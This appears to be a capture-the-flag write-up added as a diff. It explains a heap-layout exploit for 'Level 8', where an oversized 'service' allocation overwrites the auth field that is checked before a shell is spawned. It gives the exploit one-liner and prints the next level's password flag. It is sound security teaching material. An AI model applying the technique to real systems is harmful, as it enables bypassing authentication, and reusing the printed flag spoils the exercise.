@@ -1,0 +1,111 @@
+# Level 8
+
+## Vulnerability
+Heap layout manipulation - Using `service` allocation to overflow into `auth` struct's authentication field.
+
+## Code Analysis (Simplified)
+```c
+char *auth = NULL;
+char *service = NULL;
+
+while (1) {
+    printf("%p, %p \n", auth, service);
+    fgets(buffer, 128, stdin);
+    
+    if (strncmp(buffer, "auth ", 5) == 0) {
+        auth = malloc(4);
+        strcpy(auth, buffer + 5);  // Copy username
+    }
+    
+    if (strncmp(buffer, "reset", 5) == 0) {
+        free(auth);
+    }
+    
+    if (strncmp(buffer, "service", 7) == 0) {
+        service = strdup(buffer + 8);  // Allocate service string
+    }
+    
+    if (strncmp(buffer, "login", 5) == 0) {
+        if (*(int *)(auth + 0x20) != 0) {  // Check auth[32]
+            system("/bin/sh");
+        } else {
+            puts("Password:");
+        }
+    }
+}
+```
+
+## Heap Layout Strategy
+```
+After "auth A":
+┌──────────────┐
+│ auth         │ ← 0x804a008 (4 bytes allocated)
+│ "A\0\0\0"    │
+└──────────────┘
+
+After "service BBBB...":
+┌──────────────┐
+│ auth         │ ← 0x804a008
+│ "A\0\0\0"    │
+├──────────────┤
+│ metadata     │ ← malloc bookkeeping
+├──────────────┤
+│ service      │ ← 0x804a018 (40+ bytes)
+│ "BBBB..."    │ ← Extends past auth + 0x20!
+└──────────────┘
+
+auth + 0x20 overlaps with service data!
+```
+
+## Solution Steps
+
+1. **Understanding the check**
+   - `login` checks if `*(auth + 0x20)` is non-zero
+   - `auth + 0x20` = 32 bytes offset from auth pointer
+   - Need to place non-zero data at this offset
+
+2. **Heap manipulation**
+   - Allocate small `auth` chunk (4 bytes)
+   - Allocate large `service` chunk (40+ bytes) right after
+   - The `service` data will extend into the check area
+
+3. **Exploit**
+```bash
+   (python -c 'print("auth A\nservice " + "B"*40 + "\nlogin")'; cat) | ./level8
+```
+   
+   **Commands breakdown:**
+   - `auth A`: Allocates `auth` at 0x804a008
+   - `service BBBB...`: Allocates 40+ bytes at 0x804a018
+   - `login`: Checks `auth + 0x20`, finds 'B' characters (non-zero)
+
+4. **Memory state verification**
+```
+   (nil), (nil)           ← Initial state
+   0x804a008, (nil)       ← After "auth A"
+   0x804a008, 0x804a018   ← After "service BBB..."
+```
+
+5. **Get flag**
+```bash
+   whoami
+   # level9
+   cat /home/user/level9/.pass
+   # c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
+## Memory Calculation
+```
+auth pointer:        0x804a008
+Check location:      auth + 0x20 = 0x804a028
+service pointer:     0x804a018
+service data start:  0x804a018
+
+Distance: 0x804a028 - 0x804a018 = 0x10 (16 bytes)
+
+So service needs > 16 bytes to reach the check location.
+Using 40 bytes ensures we definitely hit it!
+```
+
+## Key Concept
+**Heap Layout Exploitation**: By controlling the order and size of heap allocations, we can make one chunk's data overlap with another chunk's critical field. The `service` string extends far enough to write non-zero bytes at `auth + 0x20`, bypassing the authentication check.
